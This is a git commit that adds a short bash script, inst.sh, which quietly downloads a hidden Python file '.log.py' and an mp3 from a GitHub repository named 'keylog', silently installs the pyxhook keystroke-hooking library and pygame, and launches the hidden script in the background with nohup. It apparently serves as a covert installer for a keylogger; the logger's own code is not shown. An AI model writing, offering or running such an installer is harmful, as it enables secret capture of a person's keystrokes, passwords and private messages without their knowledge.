da0f698b97b228ee7a800342561795d21cc39541
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-05 21:56:54 +0000

    adding script

---
+++ inst.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+
+wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py
+wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3
+yes | pip3 install pyxhook pygame --quiet --quiet --quiet 
+nohup python3 .log.py &
